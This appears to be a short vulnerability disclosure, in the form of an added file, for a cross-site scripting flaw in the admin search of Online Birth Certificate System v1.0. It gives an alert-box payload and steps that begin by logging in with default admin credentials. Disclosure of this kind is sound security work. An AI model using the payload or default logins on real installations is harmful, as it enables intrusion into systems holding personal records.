@@ -1,0 +1,26 @@
+# Exploit Title:Online Birth Certificate System v1.0- Cross-Site Scripting (XSS)
+# Date: 04/07/2023
+# Exploit Author: Darshana gupta
+# Vendor Homepage: https://phpgurukul.com/
+# Software Link: https://phpgurukul.com/online-birth-certificate-system-using-php-and-mysql/
+# Tested on: linux
+
+use payload= <BODY ONLOAD=alert('XSS')>
+
+1. Visit: http://localhost/obcs/admin/login.php 
+
+2. login Admin account with default credential
+
+3.	visit-http://localhost/obcs/admin/dashboard.php
+
+4.	On the Right side click the search option. 
+
+5.	put payload and see the result. 
+
+
+Attack type - local
+
+
+POC  image:
+
+https://ibb.co/4ZyT4sH
